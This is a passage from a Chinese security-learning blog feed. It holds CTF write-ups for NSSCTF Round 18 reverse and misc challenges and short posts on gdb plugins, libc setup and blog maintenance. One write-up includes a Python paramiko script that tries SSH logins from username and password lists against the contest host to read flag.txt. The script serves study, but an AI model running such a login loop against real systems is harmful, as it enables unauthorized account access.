<span class="hljs-keyword">in</span> enc:<br>    idx.append(table.index(i))<span class="hljs-comment">#遍历字节数组enc中的每个元素，使用table.index(i)方法找到该元素在table列表中的索引</span><br><br>s = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> idx:<br>    s.append(<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<span class="hljs-comment">#zfill左侧填充</span><br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0b111111</span>):<br>        c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<br>        l = <span class="hljs-number">0</span><br>        r = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>,<span class="hljs-number">2</span>):<span class="hljs-comment">#i=v3+1=i+1+1</span><br>            l = (k + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            r = (l + r + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            c[l % <span class="hljs-number">6</span>], c[r % <span class="hljs-number">6</span>] = c[r % <span class="hljs-number">6</span>], c[l % <span class="hljs-number">6</span>]<br>        d = <span class="hljs-string">&quot;&quot;</span>.join(c)<br>        <span class="hljs-keyword">if</span> d == i:<br>            res += <span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>            <span class="hljs-keyword">break</span><br><br>b = [res[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(res), <span class="hljs-number">8</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">2</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#NSSCTF&#123;Y0u_4reThe_K1ng_0fBase64&#125;</span><br></code></pre></td></tr></table></figure><h2 id="GenshinWishSimulator"><a href="#GenshinWishSimulator" class="headerlink" title="GenshinWishSimulator"></a>GenshinWishSimulator</h2><p>unity逆向</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707900162098-9fff77af-2806-41ac-866c-8991156082c7.png" class="" title="img"><p>用dnspy打开，找关键类*Manager</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707901366902-a403543b-7c1e-47b6-ad11-9776325c9cd8.png" class="" title="img"><p>用z3解方程组</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707902129974-d2e72bff-cce6-4c4d-affd-f32e5f84bf3f.png" class="" title="img"><p>得到iv</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707902261420-02f82295-67c4-477e-8674-c6ad06b5b9f1.png" class="" title="img"><p>145,118,31,48,103,110,52,82,113,19,83,44,176,130,138,129,115,110,38,10,42,100,193,105,125,61,7,229,230,180,68,133,11,177,210,122,161,60,129,140,16,45,224,83,238,0,213,157,121,193,135,197,87,118,155,110,90,91,30,158,248,44,95,215,166,247,239,43,228,114,227,146,164,137,111,79,143,17,132,14</p><p>key和填充方式很明显，但是解不出来？</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707905579072-8d1e25a1-ec40-4bb9-9c35-60d95850cc67.png" class="" title="img"><p>md，key和iv弄反了，而且key是utf-8形式，不找借口</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008328700-57e3f9c3-60ba-4b81-b999-6e1791f9855f.png" class="" title="img"><p>用另一种方式复现</p><p>要经过check函数才会执行gift</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008674108-1e115c0f-0266-4197-9f3b-d3bbd9ae9567.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008835792-7cb82437-2578-47d6-a225-1df4bbec6959.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008882947-d72a0c6a-4e9f-4efb-9dc0-83df6e4af26b.png" class="" title="img"><p>修改初始值的话选择编辑类</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008910188-821abe3f-4db0-440d-9c19-04fc8c88a72a.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009108153-0bd6ce8f-8d07-4512-bf4c-d518cbb331f3.png" class="" title="img"><p>如果直接保存模块也能出，还是有一定概率</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009225510-6cfe7d63-9df6-4784-a4ef-2e73f8f09c5f.png" class="" title="img"><p>要的flag在这里，修改一下使得它必然被执行</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009396841-b920b4d0-fa87-45f9-9058-ee4b5bf7bc4d.png" class="" title="img"><p>右键编辑方法</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009508484-d19253c5-2bba-428e-b6ea-107e6f5171ee.png" class="" title="img"><h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708053405853-dab66655-2aa2-48ae-86cf-56d3488772a7.png" class="" title="img"><p>string有dll</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708053940754-b3a3b96a-3c0b-458e-a3c4-d72451611a5c.png" class="" title="img"><p>也没看到有sha256算法</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708054072607-ad2c4d64-f471-4eb1-b285-19581f54694d.png" class="" title="img"><p>010搜索MZ</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708054194721-3290df63-dc66-4aa8-941d-49c46082fa3e.png" class="" title="img"><p>用Dnspy打开</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708063124709-72492c56-0475-4245-8080-1c845e3e67ad.png" class="" title="img"><p>用vscode运行即可</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708065409901-24731386-9db8-4c83-a1b8-df148d58cc6e.png" class="" title="img"><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="酒吧"><a href="#酒吧" class="headerlink" title="酒吧"></a>酒吧</h2><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707897006283-e11c8e66-60d8-453b-bbb4-4923172ebad4.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707897289557-b1b0d72c-33b7-452d-b9d9-3c335f494b72.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707897442652-5643f483-589a-42c4-a7ee-ac578ca09b93.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707897125919-70ff2871-f8fc-49d1-af17-80f663910385.png" class="" title="img"><h2 id="number7"><a href="#number7" class="headerlink" title="number7"></a>number7</h2><p>直接解base64会出错，修改第七个和第九个数字从0到f都不对</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707898430820-55d77299-2129-495c-8f4b-9674a7e705b3.png" class="" title="img"><p>根据Number7 而且inside NO.7猜测cisco type7加密</p><p>后面少了几位，但是不影响flag<img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708007743062-01c8b0da-a225-42ab-8bf6-0c5ee8524710.png" class="" title="img"></p><h2 id="userssss"><a href="#userssss" class="headerlink" title="userssss"></a>userssss</h2><p>想法是写脚本算md5sum，然后自动交互</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707899075674-94d6549e-74b1-4fa9-9a6d-11d6ac0001c0.png" class="" title="img"><p>不知道要向远程怎么发送，要有用户名和密码</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707899762242-e173afcc-df88-420a-a26c-f2ae5bb6c5c8.png" class="" title="img"><p>首先md5sum就是MD5，其次用ssh -p连接</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009841111-baa8ea56-12cd-4ef5-bb68-60ab768691fb.png" class="" title="img"><p>自动算md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">input</span>=<span class="hljs-string">&quot;/CVE/wordlist.txt&quot;</span><br>output=<span class="hljs-string">&quot;/CVE/4.txt&quot;</span><br><br><span class="hljs-comment"># 重置输出文件</span><br>&gt; <span class="hljs-string">&quot;$output&quot;</span><br><br><span class="hljs-comment"># 遍历wordlist.txt中的每一行</span><br><span class="hljs-keyword">while</span> IFS= read -r line || [[ -n <span class="hljs-string">&quot;$line&quot;</span> ]]; do<br>    <span class="hljs-comment"># 跳过空白行</span><br>    <span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">&quot;$line&quot;</span> ]]; then<br>        <span class="hljs-keyword">continue</span><br>    fi<br><br>    <span class="hljs-comment"># 计算每行的MD5哈希值</span><br>    md5=$(echo -n <span class="hljs-string">&quot;$line&quot;</span> | md5sum | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 将计算出的哈希值追加到4.txt文件中</span><br>    echo <span class="hljs-string">&quot;$md5&quot;</span> &gt;&gt; <span class="hljs-string">&quot;$output&quot;</span><br>done &lt; <span class="hljs-string">&quot;$input&quot;</span><br></code></pre></td></tr></table></figure><p>自动交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko<br><br><span class="hljs-comment"># 设置主机信息</span><br>hostname = <span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span><br>port = <span class="hljs-number">28591</span><br><br><span class="hljs-comment"># 读取用户名和密码列表</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wordlist.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> user_file:<br>    usernames = user_file.read().splitlines()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;10.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> pass_file:<br>    passwords = pass_file.read().splitlines()<br><br><span class="hljs-comment"># 确保用户名和密码列表长度相同</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(usernames) == <span class="hljs-built_in">len</span>(passwords), <span class="hljs-string">&quot;用户名和密码数量不匹配&quot;</span><br><br><span class="hljs-comment"># 尝试登录并执行命令</span><br><span class="hljs-keyword">for</span> username, password <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(usernames, passwords):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 初始化SSH客户端</span><br>        client = paramiko.SSHClient()<br>        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>        <br>        <span class="hljs-comment"># 尝试连接</span><br>        client.connect(hostname, port, username, password, timeout=<span class="hljs-number">10</span>)<br>        <br>        <span class="hljs-comment"># 执行ls命令</span><br>        stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>        output = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 检查是否存在flag.txt</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag.txt&#x27;</span> <span class="hljs-keyword">in</span> output:<br>            <span class="hljs-comment"># 读取flag.txt内容</span><br>            stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;cat flag.txt&#x27;</span>)<br>            flag_content = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到flag: <span class="hljs-subst">&#123;flag_content&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;在用户 <span class="hljs-subst">&#123;username&#125;</span> 的目录中没有找到flag.txt&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;登录失败：用户名 <span class="hljs-subst">&#123;username&#125;</span> 或密码错误&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发生错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        client.close()<br></code></pre></td></tr></table></figure><h2 id="debuger"><a href="#debuger" class="headerlink" title="debuger"></a>debuger</h2><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707900005164-82c057dc-c10c-49f9-aec2-d971f65cf2b8.png" class="" title="img"><p>无回显，不知道咋搞</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707899993621-4167f971-9006-43eb-96b0-537de9b89587.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn调试插件的安装与切换</title>
    <link href="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%88%87%E6%8D%A2/"/>
    <url>/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%88%87%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.7.5</p><p>链接如下：</p><p><a href="https://blog.csdn.net/aoxixi/article/details/90142736">https://blog.csdn.net/aoxixi/article/details/90142736</a></p><p>pwndbg,peda,gef三个插件到GdbPlugins目录下启动对应命令切换即可，Google还是好用，再类推一下马上就能切换三个插件了，也算是搞了两天了😫😫，终于成功！</p><p>对应启动命令：</p><p>echo “source ~&#x2F;GdbPlugins&#x2F;peda&#x2F;peda.py” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;gef&#x2F;gef.py” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;gdbinit&#x2F;gdbinit” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;pwndbg&#x2F;gdbinit.py” &gt; ~&#x2F;.gdbinit</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>如何安装libcsearch</title>
    <link href="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/"/>
    <url>/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/</url>
    
    <content type="html"><![CDATA[<p>github上libcsearch只对python2有效，用python3就找不到匹配的libc版本了，网上说的重装或者更新都是针对python2的，由于本机安装pwntools用的是python3且python2已经不维护了，干脆就另寻出路</p><p><a href="https://pypi.org/project/LibcSearcher/#files">https://pypi.org/project/LibcSearcher/#files</a></p><p>从上面的链接中下载libcsearch可满足python3</p><p>然后再去跑脚本，果然可以了</p><img src="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/1691905062554-b22ce7a6-1d9a-4bf7-972b-b4a57d8cab49.png" class="" title="img"><p>这是远程的libc选择，和本地不一样</p><p>上网查一下发现ubuntu18对应libc2.27，先试一下第三个，成功</p><img src="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/1691905008510-c2cd1f79-d48d-422d-9ae0-659f0d94e1e0.png" class="" title="img"><p>还有个问题是要知道本机的libc版本，我这里是libc6_2.36-4_amd64,这样打本地会快一点，每次打个一两分钟都是常有的事，不用奇怪</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制文件存在但仍有FileNotFoundError</title>
    <link href="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/"/>
    <url>/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/</url>
    
    <content type="html"><![CDATA[<p>桌面明明有vuln这个文件，但是kali仍有FileNotFoundError</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/4BE59ACDFB71F188E62CCF1B8E4A7979.jpg" class="" title="img"><p>问群里的师傅原来是要装glibc-all-in-one</p><p>一开始师傅说要用.&#x2F;libc.so.6查看要安装的libc版本，但本地一直报错</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/7DFD5873CC9E06A971F4766218EB5E2C.jpg" class="" title="img"><p>我google了但是一直没有直接的解决方案，于是在另一位师傅的推荐下看了另一篇文档，用strings libc.so.6 |grep Ubuntu来确定需要安装的libc库 </p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215652930.png" class="" title="image-20240201215652930"><p>直接下载libc出错，于是去官网手动下载</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215612566.png" class="" title="image-20240201215612566"><p>最后按教程配置即可</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215510938.png" class="" title="image-20240201215510938"><p>参考链接：<a href="https://www.freebuf.com/sectool/366854.html">https://www.freebuf.com/sectool/366854.html</a></p><p><a href="https://blog.csdn.net/weixin_49764009/article/details/124970461">【kali】 glibc-all-in-one安装 （解决version <code>GLIBC_2.34‘ not found）_version </code>glibc_2.34’ not found-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>以一道pwn题学习如何动调</title>
    <link href="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/"/>
    <url>/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/</url>
    
    <content type="html"><![CDATA[<p>这是0xGame的week2的一道pwn题，题目本身不难，有一个疑问，刚好借此巩固了一下pwn的动调，希望可以有所收获</p><p><strong>目标：去看dword_40e0改变后的值</strong></p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696928256892-d5876add-9c6c-48f5-a51b-ec3c4a6ace91.png" class="" title="img"><p>一开始是2，memset赋值为0</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933587412-3d11e82a-c48c-48a4-91c9-c5d8ffea408e.png" class="" title="img"><p><strong>查看内存注意不要加*</strong></p><p>因为是小端序，红色框起来的部分是shopping_cart[0]</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696931566289-5ff15310-4891-45fc-a21c-36b568debc5f.png" class="" title="img"><p>看基址</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696928301743-312c76ab-6eda-4690-beb0-643c5b194883.png" class="" title="img"><p><strong>加偏移后得到真实地址</strong></p><p>在两次scanf之间下断点</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933156497-0828eea7-53fe-441e-8643-1c57ec02a3aa.png" class="" title="img"><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933120221-449859d4-9339-433c-8c6c-2095728035b8.png" class="" title="img"><p>有断点所以会停下来</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933208375-7fd26797-e85b-434c-82a5-444f7d6dc676.png" class="" title="img"><p>单步步过至0x5555555555452(超过544f）</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933320205-b8f8d425-ff15-4ad5-96c4-fb5f81598879.png" class="" title="img"><p>再看内存就发现变了</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933006068-cde05956-be30-4e84-bbb3-8faaab80f643.png" class="" title="img"><p>用w查看内存就可以避免端序问题</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933427059-5ce862e5-b191-4be7-9378-2d1622ea0353.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>减少虚拟机内存</title>
    <link href="/2024/01/23/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%86%85%E5%AD%98/"/>
    <url>/2024/01/23/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%86%85%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.8.16</p><p>我的kali22.04占物理机内存60多个G，也没安装什么大型软件，不知道为什么水涨船高，从40多G到66.6G，去谷歌上搜也没什么好的办法，就自己研究了一下</p><h1 id="克隆原虚拟机"><a href="#克隆原虚拟机" class="headerlink" title="克隆原虚拟机"></a>克隆原虚拟机</h1><p>之前想的克隆应该是一模一样的，但好多了，从原来66.6G直接变成39个G</p><img src="/2024/01/23/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%86%85%E5%AD%98/1697605034183-80578df9-810a-40b8-9270-a27794f809e3.png" class="" title="img"><p>不知道之后会不会自动涨内存，先这样再说</p><h1 id="删一些未知的文件"><a href="#删一些未知的文件" class="headerlink" title="删一些未知的文件"></a>删一些未知的文件</h1><p>这是我先克隆一个虚拟机再进行的操作，想着这些未知又占内存的应该没什么用，就手动一个个删了，发现对虚拟机运行真没影响。当然这样有点冒险，慎用</p><img src="/2024/01/23/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%86%85%E5%AD%98/1697604744305-82590b55-8e9f-422a-8b83-f4afa8d56425.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>搭建博客时个人遇到的一些问题</title>
    <link href="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <url>/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>本文主要是记录一些与时俱进的问题（因为网上的教程大都是三四年前的了）和个人的一些非预期做法</p><h1 id="本地博客映射到github"><a href="#本地博客映射到github" class="headerlink" title="本地博客映射到github"></a>本地博客映射到github</h1><p>执行<code>hexo clean&amp;hexo g -d</code>后会有像下面一样时不时地报错，网上的不是很行，我这里把github名改成和博客名一样就行了</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/1.png" class="" title="image-20240114211559597"><p>目前我的github是这么个页面</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/image-20240114212817973.png" class="" title="image-20240114212817973"><h1 id="统计访问量"><a href="#统计访问量" class="headerlink" title="统计访问量"></a>统计访问量</h1><p>按教程用leancloud统计访问量不知道为什么本地能看到但是远程一直看不到，试了busuanzi发现也差不多</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/image-20240114212107890.png" class="" title="image-20240114212107890"><h1 id="添加图片"><a href="#添加图片" class="headerlink" title="添加图片"></a>添加图片</h1><p><a href="https://zhuanlan.zhihu.com/p/280758822#:~:text=hexo%E5%8D%9A%E5%AE%A2%E6%98%BE%E7%A4%BAmarkdown%E8%B7%AF%E5%BE%84%E7%9A%84%E5%9B%BE%E7%89%87%201%20%E4%BF%AE%E6%94%B9%20_config.yml%20%E4%B8%AD%E7%9A%84%20post_asset_folder%3A%20true%202,install%20hexo-image-link%20--save%204%20%E4%BF%AE%E6%94%B9md%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%20%21%20%5Blabel%5D%20%28markdown-file-name%2Fimage-name.jpg%29">hexo博客显示markdown路径的图片 - 知乎 (zhihu.com)</a></p><p>我没有用教程给的方法，而是自己找了一个，把图片直接复制到文档里，markdown和博客都能直接看到图片，简洁明了</p><p>总结来说，最后能成功还是满意的，还是要自己多实践，培养独立解决问题的能力</p><p>总的参考教程附上：<a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>简单使用MT管理器</title>
    <link href="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/"/>
